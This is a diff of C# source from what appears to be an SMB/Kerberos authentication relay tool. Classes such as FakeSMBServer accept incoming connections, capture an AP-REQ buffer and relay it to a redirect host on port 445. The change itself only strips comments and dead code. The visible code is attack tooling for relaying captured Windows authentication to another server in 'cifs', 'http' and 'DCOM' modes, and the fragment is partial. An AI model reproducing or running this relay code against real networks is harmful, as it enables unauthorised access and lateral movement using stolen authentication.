@@ -85,8 +85,7 @@ class SMBCommandSocketConsole
             Console.WriteLine("[*] ===> SMB Console Server started on [any:{0}]. Waiting for connections...<===", port);
             //while (true)
             {
-                // Accept a client socket
-                //Socket clientSocket = listener.AcceptTcpClientAsync(); // AcceptSocket(); //AcceptTcpClientAsync()
+                
                 TcpClient clientSocket = await listener.AcceptTcpClientAsync();
 
 
@@ -97,24 +96,16 @@ class SMBCommandSocketConsole
                 smbc.currSourceSocket = state.SourceSocket;
                 smb2.alreadyLoggedIn = true;
                 smbc.currDestSocket = state.TargetSocket;
-                //smbc.ServerType = State.ServerType;
+                
                 smbc.currSocketServer = currSocketServer;
-                /*bool isConnected = smbc.Connect(Program.RedirectHost, SMBTransportType.DirectTCPTransport);
-                if (!isConnected)
-                {
-                    Console.WriteLine("[-] Could not connect to [{0}:445]", Program.targetFQDN);
-
-                }
-                */
+                
 
 
                 Console.WriteLine("[*] SMB Console Server client [{0}] relay Connected to: [{1}:445]", clientSocket.Client.RemoteEndPoint, Program.targetFQDN);
-                //state.isRelayed = true;
-                //Task.Run(() => smb2.smbConnect(smbc));
                 Task.Run(() => smb2.smbConnect(smbc, buffer));
 
 
-                // Handle the client connection
+                
 
             }
         }
@@ -185,10 +176,7 @@ public class FakeSMBServer
 
     public FakeSMBServer(int listenPort, string targetHost, int targetPort)
     {
-        /*_listenerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-        _listenerSocket.Bind(new IPEndPoint(IPAddress.Any, listenPort));
-        _listenerSocket.Listen(100); // Allow up to 100 pending connections
-        _targetEndpoint = new IPEndPoint(Dns.GetHostEntry(targetHost).AddressList[0], targetPort);*/
+        
         _listenPort = listenPort;
         _targetHost = targetHost;
         _targetPort = targetPort;
@@ -196,10 +184,7 @@ public class FakeSMBServer
     }
     public FakeSMBServer(int listenPort, string targetHost, int targetPort, string stype)
     {
-        /*_listenerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-        _listenerSocket.Bind(new IPEndPoint(IPAddress.Any, listenPort));
-        _listenerSocket.Listen(100); // Allow up to 100 pending connections
-        _targetEndpoint = new IPEndPoint(Dns.GetHostEntry(targetHost).AddressList[0], targetPort);*/
+        
         _listenPort = listenPort;
         _targetHost = targetHost;
         _targetPort = targetPort;
@@ -258,27 +243,24 @@ public class FakeSMBServer
             Socket clientSocket = _listenerSocket.EndAccept(ar);
 
             _listenerSocket.BeginAccept(OnClientConnect, null);
-            // Create a unique key for this connection
+        
             string clientKey = $"{clientSocket.RemoteEndPoint}-{Guid.NewGuid()}";
 
-            //Console.WriteLine($"[*] FakeSMBServer:{_listenPort} -> Client connected [{clientSocket.RemoteEndPoint}] in {(Program.forwdardmode ? "FORWARD" : "RELAY")} mode.", _listenPort);
-
-            // Create a new connection to the target server
             Socket targetSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
             targetSocket.Connect(_targetEndpoint);
 
-            // Create state objects for bidirectional forwarding
+        
             var clientToTargetState = new State(clientSocket, targetSocket);
             var targetToClientState = new State(targetSocket, clientSocket);
 
-            // Add the connection to the dictionary
+        
             _activeConnections[clientKey] = clientToTargetState;
 
             // Start forwarding data in both directions
             clientSocket.BeginReceive(clientToTargetState.Buffer, 0, clientToTargetState.Buffer.Length, SocketFlags.None, OnDataFromClient, clientToTargetState);
             targetSocket.BeginReceive(targetToClientState.Buffer, 0, targetToClientState.Buffer.Length, SocketFlags.None, OnDataFromTarget, targetToClientState);
 
-            // Continue accepting new connections
+        
 
         }
         catch (Exception ex)
@@ -291,15 +273,13 @@ public class FakeSMBServer
     {
         state = (State)ar.AsyncState;
         byte[] buffer = new byte[4096];
-        //if (state.isRelayed)
-        //  return;
         try
         {
             int bytesRead = state.SourceSocket.EndReceive(ar);
             int l = 0;
             if (bytesRead > 0)
             {
-                // Forward data to the target
+        
                 state.numReads++;
 
                 if (!Program.forwdardmode && !ForwardOnly && ServerType == "SMB")
@@ -319,8 +299,6 @@ public class FakeSMBServer
 
 
 
-                    //Program.currSourceSocket = state.SourceSocket;
-                    //Program.currDestSocket = state.TargetSocket;
                     if (Program.service == "cifs")
                     {
 
@@ -347,7 +325,7 @@ public class FakeSMBServer
                             smbc.currSourceSocket = state.SourceSocket;
                             smbc.currDestSocket = state.TargetSocket;
                             smbc.ServerType = ServerType;
-                            //smbc.currSocketServer = this;
+                            
                             bool isConnected = smbc.Connect(Program.RedirectHost, SMBTransportType.DirectTCPTransport);
                             if (!isConnected)
                             {
@@ -362,8 +340,7 @@ public class FakeSMBServer
 
                             Task.Run(() => smb2.smbConnect(smbc, Program.apreqBuffer));
 
-                            //CloseConnection(state);
-                            //return;
+                            
                         }
                     }
                     if (Program.service == "http")
@@ -381,21 +358,7 @@ public class FakeSMBServer
 
                 if (!Program.forwdardmode && !ForwardOnly && ServerType == "DCOM")
                 {
-                    /*
-                    TcpClient myclient;
-                    myclient = new TcpClient();
-                    myclient.Connect("127.0.0.1", 135);
-                    NetworkStream ns2 = myclient.GetStream();
-                    ns2.Write(state.Buffer, 0, bytesRead);
-                    bytesRead = ns2.Read(buffer, 0, 4096);
-                    Array.Copy(buffer, 20, Program.AssocGroup, 0, 4);
-                    state.SourceSocket.Send(buffer, bytesRead, SocketFlags.None);
-                    l = state.SourceSocket.Receive(buffer);
-                    Program.apreqBuffer = new byte[bytesRead];
-
-                    // Copy contents of source array to destination array
-                    Array.Copy(buffer, Program.apreqBuffer, bytesRead);
-                    Program.CallID[0] = Program.apreqBuffer[12];*/
+                    
 
                 }
 
@@ -407,16 +370,12 @@ public class FakeSMBServer
                 {
                     state.TargetSocket.Send(state.Buffer, bytesRead, SocketFlags.None);
 
-                    // Continue receiving data from the client
-
-
-                    // Continue receiving data from the client
                     state.SourceSocket.BeginReceive(state.Buffer, 0, state.Buffer.Length, SocketFlags.None, OnDataFromClient, state);
                 }
             }
             else
             {
-                // Client disconnected
+                
                 if (!state.isRelayed)
                     CloseConnection(state);
             }
